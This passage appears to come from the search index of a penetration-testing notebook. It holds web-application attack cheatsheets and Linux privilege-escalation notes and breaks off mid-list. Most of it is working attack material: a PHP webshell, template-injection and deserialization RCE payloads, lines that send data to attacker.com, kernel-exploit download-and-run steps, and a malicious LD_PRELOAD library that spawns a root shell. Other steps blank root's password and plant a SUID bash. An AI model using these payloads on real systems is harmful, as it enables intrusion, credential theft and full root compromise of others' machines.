<code>;</code>, <code>&amp;&amp;</code>, <code>|</code> followed by commands like <code>whoami</code> Automated: <pre><code>commix --url=\"target.com/ping?host=127.0.0.1\"\nnuclei -u target.com -t command-injection/\n</code></pre></p> <p>Exploit: <pre><code>; whoami\n&amp;&amp; id\n| cat /etc/passwd\n`curl attacker.com/$(whoami)`\n$(nslookup whoami.attacker.com)\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#file-upload","title":"FILE UPLOAD","text":"<p>Present when: File uploads lack proper validation and execution prevention Also see: Insecure File Uploads Manual: Upload various file types, check execution in upload directory Automated: <pre><code>fuxploider --url target.com/upload\nnuclei -u target.com -t file-upload/\n</code></pre></p> <p>Exploit: <pre><code># Shell upload\nshell.php: &lt;?php system($_GET['cmd']); ?&gt;\n\n# Bypass techniques\nshell.php%00.jpg\nshell.Php\nshell.phtml\nGIF89a;&lt;?php system($_GET['cmd']);?&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#ssrf","title":"SSRF","text":"<p>Present when: Application makes requests to user-controlled URLs</p> <p>Manual: Replace URLs with internal IPs, cloud metadata endpoints Automated: <pre><code>ssrfmap -r request.txt -p url -m readfiles\nnuclei -u target.com -t ssrf/\n</code></pre></p> <p>Exploit: <pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://127.0.0.1:8080/admin\nfile:///etc/passwd\ngopher://127.0.0.1:6379/_SET test 1\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#ssti","title":"SSTI","text":"<p>Present when: User input embedded in template engines without sandboxing Also see: Server-Side Template Injection (SSTI) Manual: Test with <code>{{7*7}}</code>, <code>${7*7}</code>, observe if calculation occurs Automated: <pre><code>tplmap -u \"target.com/page?name=test\"\nnuclei -u target.com -t ssti/\n</code></pre></p> <p>Exploit: <pre><code># Jinja2\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# Twig\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n\n# Freemarker\n&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt; ${ ex(\"id\") }\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#path-traversallfi","title":"PATH TRAVERSAL/LFI","text":"<p>Present when: File paths constructed from user input without validation Also see: Local File Inclusion (LFI) Manual: Replace filenames with <code>../../../etc/passwd</code>, observe responses Automated: <pre><code>dotdotpwn -m http -h target.com -x 8080 -f /etc/passwd\nnuclei -u target.com -t lfi/\n</code></pre></p> <p>Exploit: <pre><code>../../../etc/passwd\n....//....//....//etc/passwd\nphp://filter/convert.base64-encode/resource=config.php\nphp://input (with POST: &lt;?php system($_GET['cmd']);?&gt;)\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#insecure-deserialization","title":"INSECURE DESERIALIZATION","text":"<p>Present when: Untrusted serialized objects are deserialized</p> <p>Manual: Look for base64/hex blobs in cookies, \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440s; decode and analyze Automated: <pre><code>ysoserial -p CommonsCollections1 -c 'id'\nphpggc -l # List gadgets\n</code></pre></p> <p>Exploit: <pre><code># Java\njava -jar ysoserial.jar CommonsCollections1 'id' | base64\n\n# PHP\nphpggc Laravel/RCE1 system id | base64\n\n# .NET\nysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"calc\"\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#idor","title":"IDOR","text":"<p>Present when: Object IDs in URLs/parameters lack proper authorization checks Also see: Insecure Direct Object Reference (IDOR) Manual: Change numeric IDs, UUIDs, usernames in parameters Automated: <pre><code>ffuf -w numbers.txt -u target.com/user/FUZZ -fc 404\nauthz0 -u target.com -H \"Cookie: session=abc\"\n</code></pre></p> <p>Exploit: <pre><code>/user/profile?id=1 \u2192 id=2\n/api/document/ABC123 \u2192 ABC124\n/order/user123 \u2192 user456\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#http-request-smuggling","title":"HTTP REQUEST SMUGGLING","text":"<p>Present when: Frontend/backend servers parse HTTP requests differently</p> <p>Manual: Send conflicting Content-Length/Transfer-Encoding headers Automated: <pre><code>smuggler.py -u target.com\nhttpreqsmuggler target.com\n</code></pre></p> <p>Exploit: <pre><code># CL.TE\nPOST / HTTP/1.1\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#business-logic-flaws","title":"BUSINESS LOGIC FLAWS","text":"<p>Present when: Application workflow can be manipulated for unintended outcomes</p> <p>Manual: Skip steps, negative values, race conditions, replay attacks Automated: <pre><code># Race condition testing\nffuf -w numbers.txt -u target.com/transfer -X POST -d \"amount=1000\" -t 50\n</code></pre></p> <p>Exploit: <pre><code>{\"price\": -100}\n{\"quantity\": -1}\n{\"role\": \"admin\"}\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#cache-poisoning","title":"CACHE POISONING","text":"<p>Present when: Web caches store responses based on manipulable headers</p> <p>Manual: Modify Host header, X-Forwarded-Host, observe cached responses Automated: <pre><code>web-cache-vulnerability-scanner -u target.com\nparam-miner --target target.com\n</code></pre></p> <p>Exploit: <pre><code>GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#cors-misconfiguration","title":"CORS MISCONFIGURATION","text":"<p>Present when: Access-Control headers are overly permissive</p> <p>Manual: Check if Origin reflects in Access-Control-Allow-Origin Automated: <pre><code>corsy -u target.com\nnuclei -u target.com -t cors/\n</code></pre></p> <p>Exploit: <pre><code>// If ACAO: * with credentials\nfetch('https://target.com/api/sensitive', {credentials: 'include'})\n.then(r=&gt;r.text()).then(d=&gt;fetch('//attacker.com?data='+btoa(d)))\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#open-redirect","title":"OPEN REDIRECT","text":"<p>Present when: Redirect destinations come from untrusted user input</p> <p>Manual: Modify redirect parameters to external domains Automated: <pre><code>openredirex -l urls.txt\nnuclei -u target.com -t redirect/\n</code></pre></p> <p>Exploit: <pre><code>?redirect=//evil.com\n?url=https://evil.com\n?next=/\\evil.com\n?return_to=//evil.com%2e.target.com\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#clickjacking","title":"CLICKJACKING","text":"<p>Present when: X-Frame-Options/CSP frame-ancestors missing</p> <p>Manual: Check response headers for frame protection Automated: <pre><code>clickjacker -u target.com\nnuclei -u target.com -t clickjacking/\n</code></pre></p> <p>Exploit: <pre><code>&lt;iframe src=\"https://target.com/admin/delete?id=123\" style=\"opacity:0.1\"&gt;&lt;/iframe&gt;\n&lt;div style=\"position:absolute;\"&gt;CLICK HERE FOR FREE MONEY!&lt;/div&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#csrf-cross-site-request-forgery","title":"CSRF (CROSS-SITE REQUEST FORGERY)","text":"<p>Present when: State-changing requests lack proper anti-CSRF tokens Cross-Site Request Forgery (CSRF) Manual: Remove CSRF tokens, check if requests still work Automated: <pre><code>xsrfprobe -u target.com\nburp csrf scanner extension\n</code></pre></p> <p>Exploit: <pre><code>&lt;form action=\"https://target.com/transfer\" method=\"POST\"&gt;\n&lt;input name=\"to\" value=\"attacker\"&gt;\n&lt;input name=\"amount\" value=\"1000\"&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit()&lt;/script&gt;\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#subdomain-takeover","title":"SUBDOMAIN TAKEOVER","text":"<p>Present when: DNS points to unclaimed cloud services</p> <p>Manual: Check CNAME records, try claiming the service Automated: <pre><code>subjack -w subdomains.txt -t 100 -timeout 30\nnuclei -u target.com -t takeovers/\n</code></pre></p> <p>Exploit: <pre><code># If CNAME points to unclaimed service\ndig subdomain.target.com\n# If points to xxx.github.io - claim that GitHub pages\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#jwt-vulnerabilities","title":"JWT VULNERABILITIES","text":"<p>Present when: JSON Web Tokens lack proper validation</p> <p>Manual: Decode JWT, modify payload/header, test none algorithm Automated: <pre><code>jwt_tool token.jwt -C -d wordlist.txt\njwttool.py -t token.jwt\n</code></pre></p> <p>Exploit: <pre><code># None algorithm\n{\"alg\":\"none\",\"typ\":\"JWT\"}\n\n# Algorithm confusion\njwt_tool token.jwt -X k -pk public.pem\n\n# Weak secret\njwt_tool token.jwt -C -d rockyou.txt\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#graphql-injection","title":"GRAPHQL INJECTION","text":"<p>Present when: GraphQL endpoints lack proper input validation</p> <p>Manual: Send malformed queries, introspection queries Automated: <pre><code>graphql-cop -t target.com/graphql\nnuclei -u target.com -t graphql/\n</code></pre></p> <p>Exploit: <pre><code># Introspection\n{__schema{types{name fields{name type{name}}}}}\n\n# Injection\n{user(id: \"1' OR 1=1--\") {name email}}\n\n# DoS\nquery {users(first: 99999999) {name}}\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#websocket-vulnerabilities","title":"WEBSOCKET VULNERABILITIES","text":"<p>Present when: WebSocket connections lack proper authentication/validation</p> <p>Manual: Connect to WebSocket, send malformed/privileged messages Automated: <pre><code>websocket-harness -u ws://target.com/ws\nwsrecon target.com\n</code></pre></p> <p>Exploit: <pre><code>ws = new WebSocket(\"ws://target.com/ws\");\nws.send('{\"action\":\"admin\",\"cmd\":\"delete_user\",\"id\":\"victim\"}');\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/WebApp/#quick-identification-checklist","title":"QUICK IDENTIFICATION CHECKLIST","text":"<pre><code># Immediate checks\ncurl -k https://target.com/robots.txt\ncurl -k https://target.com/.git/config  \ncurl -k https://target.com/admin\ncurl -k -H \"Host: evil.com\" https://target.com\n\n# Quick tests\necho '\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' # XSS\necho \"' OR 1=1--\" # SQL\necho \"../../../etc/passwd\" # LFI\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/ACLs/","title":"ACLs","text":"<p>Check ACLs on Sensitive Files <pre><code>getfacl /etc/shadow    # see if you have read permissions\ngetfacl /etc/passwd    # see if you can modify or read\n</code></pre> Check ACLs on Directories <pre><code>getfacl /usr/local/bin # maybe you can write to a directory in /usr/local/bin\ngetfacl /etc            # check if you can write to /etc/\n</code></pre> - If you have write ACL to <code>/etc</code>, you can drop a malicious script in <code>/etc/profile</code> or <code>/etc/bash.bashrc</code>.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Capabilities/","title":"Capabilities","text":"<p>https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/</p> <p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</p> <p>Restrict a binary to only certain actions using setcap</p> <pre><code>sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic\n</code></pre> Capability Desciption <code>cap_sys_admin</code> Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. <code>cap_sys_chroot</code> Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. <code>cap_sys_ptrace</code> Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. <code>cap_sys_nice</code> Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. <code>cap_sys_time</code> Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. <code>cap_sys_resource</code> Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. <code>cap_sys_module</code> Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. <code>cap_net_bind_service</code> Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. Capability Values Desciption <code>=</code> This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. <code>+ep</code> This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. <code>+ei</code> This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions. <code>+p</code> This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. <p>Several Linux capabilities can be used to escalate a user's privileges to <code>root</code>, including:</p> Capability Desciption <code>CAP_SETUID</code> Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code>root</code> user. <code>CAP_SETGID</code> Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code>root</code> group. <code>CAP_SYS_ADMIN</code> This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code>root</code> user, such as modifying system settings and mounting and unmounting file systems. <p>The following capabilities are particularly dangerous and should be investigated further if found enabled on a system:</p> <ul> <li>CAP_CHOWN</li> <li>CAP_DAC_OVERRIDE</li> <li>CAP_DAC_READ_SEARCH</li> <li>CAP_SETUID</li> <li>CAP_SETGID</li> <li>CAP_NET_RAW</li> <li>CAP_SYS_ADMIN</li> <li>CAP_SYS_PTRACE</li> <li>CAP_SYS_MODULE</li> <li>CAP_FORMER</li> <li>CAP_SETFCAP</li> </ul> <p>Find setcap capabilities</p> <pre><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\\\;\ngetcap -r / 2&gt;/dev/null\n</code></pre> <p>Have access to an account but no access to cap_sys_admin?</p> <pre><code>getcap /usr/bin/vim.basic\n</code></pre> <p>VIM can run as admin and edit files</p> <pre><code>/usr/bin/vim.basic /etc/passwd\n</code></pre> <pre><code>echo -e ':%s/^root:[^:]*:/root::/\\\\nwq' | /usr/bin/vim.basic -es /etc/passwd\n</code></pre> <pre><code>cat /etc/passwd | head -n1\nroot::0:0:root:/root:/bin/bash\n</code></pre> <p>VIM has the capability: cap_dac_override+eip</p> <pre><code>/usr/bin/vim.basic = cap_dac_override+eip\n</code></pre> <p>You can write to ANY file bypassing privs</p> <pre><code>vim /etc/sudoers\n</code></pre> <p>add your user</p> <pre><code>hacker  ALL=(ALL:ALL) ALL\n</code></pre> <p>Now you can run sudo</p> <pre><code>getcap -r / 2&gt;/dev/null\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Credential%20Hunting/","title":"Credential Hunting","text":"<p>Search for files containing \u201cpassword\u201d or \u201cpasswd\u201d <pre><code>grep -ir \"password\" /etc 2&gt;/dev/null\ngrep -ir \"passwd\" /home 2&gt;/dev/null\n</code></pre> check for dbs and config files <pre><code>find / -type f -name \"*.conf\" -exec grep -H \"DB_USER\" {} \\; 2&gt;/dev/null\nfind / -type f -name \"*.yaml\" -exec grep -H \"password\" {} \\; 2&gt;/dev/null\n</code></pre> Private keys <pre><code>find / -type f -name \"*.pem\" -o -name \"*.key\" 2&gt;/dev/null\nfind /home -type f -name \"id_rsa\" 2&gt;/dev/null\n</code></pre> Search for credentials in environment files: <pre><code>grep -R \"export\" /etc/profile /etc/bashrc \n</code></pre> git stuff <pre><code>find /home -type f -name \".git-credentials\" -o -name \".gitconfig\" 2&gt;/dev/null\n</code></pre> aws creds <pre><code>find /home -type f -path \"*aws*\" -exec grep -H \"aws_access_key_id\" {} \\; 2&gt;/dev/null\nfind / -type f -path \"*aws*\" -exec grep -H \"AWS_ACCESS_KEY_ID\" {} \\; 2&gt;/dev/null\n</code></pre> Check <code>/var/log/auth.log</code> or <code>/var/log/secure</code> for previously captured credentials or failed attempts: <pre><code>grep -i \"fail\" /var/log/auth.log\ngrep -i \"Accepted\" /var/log/auth.log\n</code></pre> Look for passwords in scripts or in <code>/opt</code>, <code>/usr/local</code>: <pre><code>grep -ir \"password\" /opt /usr/local 2&gt;/dev/null\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Environment%20Hunting/","title":"Environment Hunting","text":"<p>Check for scripts or binaries owned by root but writable by user, and abuse <code>PATH</code>: <pre><code>find / -perm -o=w -type f 2&gt;/dev/null | grep \"/usr/bin\"\n</code></pre> If a root-owned script calls binaries without full path, you can create a malicious binary earlier in <code>PATH</code>: <pre><code>export PATH=/tmp/malicious:$PATH\necho -e '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; /tmp/malicious/su\nchmod +x /tmp/malicious/su\n# When root runs \u201csu\u201d in script, it executes /tmp/malicious/su\n/tmp/rootbash -p  # drop into root shell\n</code></pre> Wildcard Injection: If a script uses wildcards like <code>cp *.txt /root/backup/</code>, place a file named <code>--help</code> or <code>-rf</code> to inject options: <pre><code>echo \"malicious\" &gt; --help\nmkdir -p /tmp/backupdir\ncp --help /tmp/backupdir      # Might treat \u201c--help\u201d as an option\n</code></pre></p> <ul> <li>If a script does something like tar -cf backup.tar <code>*</code>, place a malicious file named --checkpoint=1 to inject tar\u2019s options, or use symlinks to overwrite files.</li> <li>If a script uses for f in <code>*</code>; do somecommand $f; done, create a filename like $(rm -rf /). Use IFS or manipulate environmental variables to change how expansions occur. Kubernetes Inside Container If <code>kubectl</code> or a service account token is present, you may be able to create privileged pods or mount the host: <pre><code>ls /var/run/secrets/kubernetes.io/serviceaccount\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\nkubectl run --rm -it --image=alpine debug -- /bin/sh\n</code></pre> If you can define a pod with <code>hostPID: true</code> and <code>privileged: true</code>, you can namespace-enter the host.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/General%20Information/","title":"General Information","text":"<p>Basic Info <pre><code>whoami; id; hostname;\n</code></pre> Networking <pre><code>ip a\n</code></pre> Can you run anything as sudo <pre><code>sudo -l\n</code></pre> What operating system do we have? <pre><code>cat /etc/os-release\n</code></pre> Check user path <pre><code>echo $PATH\n</code></pre> check environment variables <pre><code>env\n</code></pre> Check kernel version <pre><code>uname -a\ncat /proc/version\n</code></pre> Check CPU info <pre><code>lscpu\n</code></pre> Check login shells <pre><code>cat /etc/shells\n</code></pre> Check attached printers: <pre><code>lpstat\n</code></pre> Check users and groups: <pre><code>cat /etc/passwd\ncat /etc/group\n</code></pre> Check who is in a group: <pre><code>getent group sudo\n</code></pre> Check home directories of users on system and inspect their history files: <pre><code>find /home -maxdepth 2 -type f -name \".*history\" -exec ls -l {} \\; 2&gt;/dev/null\nfind /home -type f -name \".bash_history\" -o -name \".zsh_history\" 2&gt;/dev/null\n</code></pre> Check running processes as root <pre><code>ps aux | grep root\n</code></pre> Env vars <pre><code>env\nprintenv\n</code></pre> Check mounted filesystems <pre><code>mount\ndf -h\n</code></pre> Check open network sockets: <pre><code>ss -tulpn\nnetstat -tulpn\n</code></pre> check crons <pre><code>crontab -l 2&gt;/dev/null\nls -la /var/spool/cron/crontabs\nls -la /etc/cron.*\ncat /etc/crontab\n</code></pre> Check system information available in <code>/proc</code>: <pre><code>find /proc -name cmdline -exec cat {} \\; 2&gt;/dev/null | tr \" \" \"\\n\"\n</code></pre> Kernel version <pre><code>uname -a\nuname -r\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Groups/","title":"Groups","text":"<p>Common Privileged Groups</p> <ul> <li>docker: Members can mount host filesystem via Docker daemon.</li> <li>disk: Can mount and read disk devices.</li> <li>lxd / lxc: Can spawn or modify containers and potentially escape.</li> <li>lpadmin, www-data, adm: Depending on context, may allow log reading or injection</li> </ul> <p>Docker group <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre> unzip alpine image <pre><code>unzip alpine.zip\n</code></pre> Choose defaults for all prompts - help: How to Set Up and Use LXD on Ubuntu 16.04 | DigitalOcean <pre><code>lxd init\n</code></pre> Import the image <pre><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\n</code></pre> set privilege flag <pre><code>lxc init alpine r00t -c security.privileged=true\n</code></pre> Mount file system <pre><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true\n</code></pre> <pre><code>lxc start r00t\nlxc exec r00t /bin/sh\n</code></pre> on the host type <code>cd /mnt/root/root</code>. From here we can read sensitive files such as <code>/etc/shadow</code> and obtain password hashes or gain access to SSH keys in order to connect to the host system as root</p> <p>Disk</p> <p>Users within the disk group have full access to any devices contained within <code>/dev</code>, such as <code>/dev/sda1</code>, which is typically the main device used by the operating system. An attacker with these privileges can use <code>debugfsto</code> access the entire file system with root level privileges.</p> <p>ADM</p> <p>Members of the adm group are able to read all logs stored in <code>/var/log</code>. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Low-Level%20Exploits/","title":"Low Level Exploits","text":"<p>Check Kernel Version for Known CVEs <pre><code>uname -r\n    ```\nExample vulnerable ranges:\n\n- **Dirty COW** (CVE-2016-5195): Linux \u2264 4.8\n- **Dirty Pipe** (CVE-2022-0847): Linux 5.8+ &lt; 5.10.102 / &lt; 5.15.25 / &lt; 5.17.9\n- **Other kernel 0-days**: search on [Exploit-DB](https://www.exploit-db.com/), [CVE Details](https://www.cvedetails.com/), or use `searchsploit`.\n**Dirty Cow**\n```bash\nwget https://raw.githubusercontent.com/dirtycow/dirtycow/master/dirtyc0w.c\ngcc dirtyc0w.c -o dirtycow\n./dirtycow\n</code></pre> Dirty Pipe <pre><code>git clone https://github.com/ashishb/dirtypipe.git\ncd dirtypipe\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe\n</code></pre> CVE-2022-27666 (Netfilter Privilege Escalation) <pre><code>git clone https://github.com/niklasb/CVE-2022-27666.git\ncd CVE-2022-27666\nmake\n./cve-2022-27666\n</code></pre> CVE-2021-3156 (Sudo \u201cBaron Samedit\u201d) (\u2264 1.8.31p2) is vulnerable <pre><code>git clone https://github.com/blasty/CVE-2021-3156.git\ncd CVE-2021-3156\ngcc cve-2021-3156.c -o exploit\n./exploit\n</code></pre> CVE-2021-3560 (Polkit) <pre><code>git clone https://github.com/berdav/CVE-2021-3560.git\ncd CVE-2021-3560\ngcc cve-2021-3560.c -o exploit\n./exploit\n</code></pre> Check and load kernel Modules <pre><code>lsmod                # list loaded modules\nsudo modprobe tun    # check if tun module can be loaded\n</code></pre> - If you have <code>CAP_SYS_MODULE</code>, you can compile and load a malicious kernel module to gain root. - </p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/","title":"NFS, Samba, Network Shares","text":"<p>NFS Shares <pre><code>showmount -e target_host   # enumerate exports\nmount -t nfs target_host:/exported/path /mnt\n</code></pre> If you can write to a writable NFS export that\u2019s mounted on the server\u2019s root (e.g., <code>/home</code>), you can place an SSH key in <code>/mnt/root/.ssh/authorized_keys</code>. Samba / CIFS <pre><code>mount -t cifs //server/share /mnt -o username=user,password=pass,noperm\n</code></pre> If <code>noperm</code> is set or the share is writable by user, you can: <pre><code>chown root:root /mnt/myscript.sh\nchmod 4755 /mnt/myscript.sh\n</code></pre> If a root-owned service executes <code>myscript.sh</code> from <code>/mnt</code>, you gain root.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Permissions/","title":"Permissions","text":"<p>SUID <pre><code>find / -perm /4000 -type f 2&gt;/dev/null\n</code></pre> SGID <pre><code>find / -perm -2000 -type f 2&gt;/dev/null\n</code></pre> writeable SUIDs <pre><code>find / -perm -4000 -type f -writable 2&gt;/dev/null\n</code></pre> - If a SUID binary is writable by your user, you can replace it with code that spawns a root shell.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Restricted%20Shells/","title":"Restricted Shells","text":"<p>Check shell <pre><code>echo $0\n</code></pre> Can you switch shells? <pre><code>/bin/bash -p\n</code></pre> spawn shell with <code>vi</code> <pre><code>vi -c ':!bash'\nvi -c ':!sh'\n</code></pre> <code>more</code> or <code>less</code> to spawn shell <pre><code>more /etc/passwd\n# then type \u201c!sh\u201d to open shell\n</code></pre> find for execution <pre><code>find . -exec /bin/sh \\; -quit\n</code></pre> perl or python <pre><code>perl -e 'exec \"/bin/sh\";'\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> awk <pre><code>awk 'BEGIN { system(\"/bin/sh\") }'\n</code></pre> If <code>ssh</code> client is available, you can do <code>ssh user@localhost</code> if key-based auth exists.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/","title":"Service Based Escalation","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#cron","title":"Cron","text":"<p>List All Cron Jobs <pre><code>cat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/\nls -la /etc/cron.hourly/\nls -la /etc/cron.weekly/\nls -la /etc/cron.monthly/\nls -la /var/spool/cron/crontabs/\n</code></pre> - Check for writable directories with scripts / what the script is calling</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#logrotate-based-escapes","title":"Logrotate-Based Escapes","text":"<p><pre><code>ls -la /etc/logrotate.d/\ncat /etc/logrotate.conf\n</code></pre> If you can write to a file in <code>/etc/logrotate.d/</code>, add a <code>postrotate</code> script that creates a SUID binary: <pre><code>/var/log/myapp/*.log {\n    daily\n    missingok\n    rotate 7\n    notifempty\n    compress\n    sharedscripts\n    postrotate\n        cp /bin/bash /tmp/rootbash\n        chmod +s /tmp/rootbash\n    endscript\n}\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#systemd-sysv-init-scripts","title":"Systemd &amp; SysV Init Scripts","text":"<p>List Systemd Service Files <pre><code>ls -la /etc/systemd/system/*.service\nls -la /lib/systemd/system/*.service\n</code></pre> Inspect Service File Contents <pre><code>cat /etc/systemd/system/vulnerable.service\n</code></pre> Look for fields like <code>ExecStart=/usr/bin/somescript.sh</code>. If <code>somescript.sh</code> is writable, replace it with malicious code. Check for Writable <code>/etc/default</code> or <code>/etc/sysconfig</code> Files Many SysV init scripts source configuration from <code>/etc/default/servicename</code> or <code>/etc/sysconfig/servicename</code>. If writable, you can modify the environment the service runs in or the path to the binary. Reload &amp; Restart Service to Trigger Execution <pre><code>systemctl daemon-reload\nsystemctl restart vulnerable.service\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/","title":"Shared Libraries & Interpreter Hijacking","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/#ld_preload-shared-library-hijacking","title":"LD_PRELOAD &amp; Shared Library Hijacking","text":"<ol> <li>Find Binaries That Honor LD_PRELOAD (Including SUID) <pre><code>find / -perm -4000 -type f 2&gt;/dev/null | while read -r bin; do\n  echo \"[*] Checking $bin\"\n  ldd \"$bin\" 2&gt;/dev/null | grep \"=&gt;\" &amp;&amp; echo \"[+] $bin loads shared libs\"\ndone\n</code></pre></li> <li>Create a Malicious Shared Object <pre><code>// exploit.c\n#include &lt;unistd.h&gt;\nvoid __attribute__((constructor)) init() {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/sh\");\n}\n</code></pre> <pre><code>gcc -shared -fPIC -o /tmp/exploit.so exploit.c\n</code></pre></li> <li>Preload &amp; Execute the SUID Binary <pre><code>export LD_PRELOAD=/tmp/exploit.so\n/path/to/suid_binary\n</code></pre></li> <li>If the binary loads <code>libc</code> or another library, your <code>exploit.so</code> runs as root.</li> <li>Modify <code>/etc/ld.so.conf.d</code> if Writable 